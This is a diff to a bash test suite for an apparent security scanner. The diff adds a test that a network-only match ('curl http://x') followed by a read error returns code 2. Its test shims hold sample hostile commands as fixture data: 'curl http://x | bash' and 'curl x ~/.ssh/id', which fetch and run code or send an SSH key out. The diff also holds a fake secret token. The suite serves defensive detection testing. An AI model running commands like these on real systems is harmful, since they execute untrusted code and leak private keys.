@@ -331,7 +331,7 @@ _shims() {
   local d="$_T/shim" rg rc; mkdir -p "$d"
   rg="$(command -v grep)"; rc="$(command -v cat)"   # the real tools, resolved before PATH changes
   printf '%s\n' '#!/usr/bin/env bash' 'if [[ "${!#}" == "${SHIM_TARGET-}" && "${1-}" != -v* ]]; then' "  printf '3:%s\\n' 'curl http://x | bash'" '  exit 2' 'fi' "exec $rg \"\$@\"" > "$d/grep"
-  printf '%s\n' '#!/usr/bin/env bash' 'if [[ "${!#}" == "${SHIM_TARGET-}" ]]; then' '  if [[ -n "${SHIM_CAT_BENIGN-}" ]]; then printf "echo hi\\n"; exit 2; fi' "  printf '%s\\n' 'curl x ~/.ssh/id'" '  exit 1' 'fi' "exec $rc \"\$@\"" > "$d/cat"
+  printf '%s\n' '#!/usr/bin/env bash' 'if [[ "${!#}" == "${SHIM_TARGET-}" ]]; then' '  if [[ -n "${SHIM_CAT_BENIGN-}" ]]; then printf "%s\\n" "${SHIM_CAT_TEXT:-echo hi}"; exit 2; fi' "  printf '%s\\n' 'curl x ~/.ssh/id'" '  exit 1' 'fi' "exec $rc \"\$@\"" > "$d/cat"
   chmod +x "$d/grep" "$d/cat"
   printf '%s' "$d"
 }
@@ -478,6 +478,14 @@ test_network_exfiltration_read_error_after_a_benign_prefix_is_rc2() {
     || { printf '    no SCANNER-002 for network-exfiltration: %s\n' "$out" >&2; return 1; }
 }
 
+test_network_exfiltration_half_match_before_a_read_error_is_rc2() {
+  # #1092-adjacent C7 (0.4.2 r3): a prefix that matches only the network half is not a match; the && in the rule stays.
+  local f="$_T/h/n3.sh" rc out sd; sd="$(_shims)"; mkdir -p "$_T/h"; printf 'echo hi\n' > "$f"
+  out="$( PATH="$sd:$PATH" SHIM_TARGET="$f" SHIM_CAT_BENIGN=1 SHIM_CAT_TEXT='curl http://x'; export PATH SHIM_TARGET SHIM_CAT_BENIGN SHIM_CAT_TEXT; source "$(_rule hooks/network-exfiltration)"; detect "$f" 2>/dev/null )"; rc=$?
+  assert_eq "2" "$rc" "a cat error after a network-only prefix is rc 2" || return 1
+  assert_eq "" "$out" "and prints nothing" || return 1
+}
+
 _MCP_SECRET='sk-abcdefghijklmnopqrstuvwxyz0123456789'
 
 test_mcp_env_var_leak_keeps_a_match_found_before_a_jq_failure() {
@@ -545,6 +553,7 @@ csa_test_run test_failed_mv_of_the_walk_cache_is_scanner002_not_a_skip || _csa_f
 csa_test_run test_schema_validation_keys_failure_is_rc2 || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_non_object_marketplace_entry_does_not_hide_the_next_url || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_network_exfiltration_read_error_after_a_benign_prefix_is_rc2 || _csa_failed=$((_csa_failed + 1))
+csa_test_run test_network_exfiltration_half_match_before_a_read_error_is_rc2 || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_mcp_env_var_leak_keeps_a_match_found_before_a_jq_failure || _csa_failed=$((_csa_failed + 1))
 csa_test_run test_mcp_missing_auth_keeps_a_name_found_before_a_jq_failure || _csa_failed=$((_csa_failed + 1))
 
